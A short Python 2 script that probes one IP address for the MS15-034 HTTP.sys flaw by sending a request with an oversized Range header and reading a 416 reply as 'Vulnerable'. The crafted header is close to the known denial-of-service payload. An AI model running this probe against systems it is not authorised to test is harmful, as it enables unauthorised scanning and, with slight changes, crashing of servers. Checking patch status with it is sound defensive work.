#Quick check for MS-15-034. Supports single IP at a time. 
import requests
import sys
try:
	ip = sys.argv[1]
	host = 'http://' + ip + '/'
	headers_spec = {'HOST':ip, 'Range':'bytes=0-18446744073709551615'}
	try:
		req = requests.get(host, headers=headers_spec)
	except:
		print 'Cannot be reached'
	if (req.status_code == 416):
		print 'Vulnerable'
	else: 
		print 'Not Vulnerable'
except:
	print 'Please give some target to shoot at'
